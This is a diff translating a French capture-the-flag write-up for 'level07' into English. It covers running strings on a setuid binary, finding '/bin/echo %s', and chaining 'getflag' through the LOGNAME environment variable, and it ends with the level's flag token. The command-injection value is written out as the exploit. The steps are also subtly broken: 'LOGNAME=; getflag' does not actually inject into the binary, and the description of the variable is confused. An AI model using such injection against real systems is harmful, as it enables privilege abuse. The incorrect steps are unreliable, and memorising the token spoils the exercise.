@@ -1,42 +1,45 @@
 # level07
 
-1. Fichiers trouvés dans `~/` :
+1. Files found in `~/` :
 
 ```bash
 ./level07
 ```
 
-2) Analyse du binaire :
+2. Binary analysis
 
 ```bash
 strings level07
 ```
 
-Une ligne retient notre attention :
+One line catches our attention :
 
 ```bash
 /bin/echo %s 
 ```
 
-Le script affiche donc une variable qui se nomme `level07`. Nous allons grep toutes les variables d'environnement qui se nomment `level07`, et deux sont retenues :
+The script therefore displays a variable named `level07`. We will grep all environment variables named `level07`, and two are retained :
 
 ```bash
 USER=level07
 LOGNAME=level07
 ```
 
-3) Exploitation : renommer `LOGNAME` pour échapper `echo` et chaîner `getflag`.
+3. Exploitation
+
+Rename `LOGNAME` to escape `echo` and chain `getflag` :
 
 ```bash
 LOGNAME=; getflag
+./level07
 ```
 
-4) Exécution : lancer `./level07` afin d'exécuter la commande `echo` prévue, puis `; getflag`.
+The execution launches `./level07` to execute the expected `echo` command, then `; getflag`.
 
 ```bash
 echo $LOGNAME; getflag
 ```
 
-5) Token découvert :
+4. Token discovered
 
-Le token est `fiumuikeil55xe9cu4dood66h`.
+The token is : `fiumuikeil55xe9cu4dood66h`
